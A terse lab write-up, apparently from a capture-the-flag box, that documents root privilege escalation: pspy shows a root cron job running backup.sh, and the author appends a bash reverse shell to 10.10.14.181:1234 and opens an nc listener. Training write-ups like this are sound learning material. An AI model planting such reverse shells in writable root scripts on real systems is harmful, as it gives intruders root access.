# IP : 
> 10.129.2.210

# Interesting file :
> /dmz-backups/backup.sh

# Cmd use : 

> /pspy32 -pf -i 1000|grep backup.sh <Searching backup.sh Process ID>
2022/09/01 13:59:43 CMD: UID=1008 PID=2009   | grep --color=auto backup.sh 
2022/09/01 14:00:01 CMD: UID=0    PID=2023   | /bin/bash /dmz-backups/backup.sh 
2022/09/01 14:00:01 CMD: UID=0    PID=2022   | /bin/sh -c /dmz-backups/backup.sh

> cp /dmz-backups/backup.sh backup.sh <Create Backup

> nano /dmz-backups/backup.sh <Editing backup.sh>
 
> #!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -c "bash -i >& /dev/tcp/10.10.14.181/1234 0>&1" 0>&1 <Adding Bash Reverse Shell >

> nc -lvnp 1234